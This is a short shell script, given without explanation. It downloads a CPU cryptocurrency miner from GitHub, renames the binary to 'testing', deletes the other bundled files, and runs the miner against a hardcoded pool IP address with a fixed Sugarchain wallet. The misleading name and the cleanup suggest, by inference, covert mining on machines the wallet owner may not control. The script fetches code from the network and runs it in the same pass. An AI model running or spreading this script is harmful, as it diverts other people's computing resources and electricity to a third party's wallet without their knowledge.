sudo apt-get update
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar xf cpuminer-opt-linux.tar.gz 
rm cpuminer-opt-linux.tar.gz 
mv cpuminer-sse2 testing
rm cpuminer-avx
rm cpuminer-sse42-aes
rm cpuminer-avx2
rm cpuminer-avx512
rm cpuminer-ryzen
rm cpuminer-sse2amd
rm cpuminer-sse42
rm miner-bellcoin.sh
rm miner-bitzeny.sh
rm miner-blakestar2.sh
rm miner-circcash.sh
rm miner-cpuchain.sh
rm miner-cranepay.sh
rm miner-curve.sh
rm miner-dms.sh
rm miner-goldcash.sh
rm miner-gxx.sh
rm miner-iso.sh
rm miner-koto.sh
rm miner-litb.sh
rm miner-microbitcoin.sh
rm miner-pyrk.sh       
rm miner-sprint.sh
rm miner-uraniumx.sh
rm miner-raptoreum.sh  
rm miner-sugar.sh     
rm miner-veco.sh
rm miner-res.sh        
rm miner-swamp.sh     
rm miner-yenten.sh
rm miner-ring.sh       
rm miner-tidecoin.sh
rm miner-obtc.sh
rm miner-magpiecoin.sh
./testing -a yespowersugar -t4 -p d=0.001 -o  stratum+tcp://62.171.150.191:7042 -u sugar1qwwdgg40rhaaqhyszq65j2c9jzvxcr7k4guyzme.abuitungir
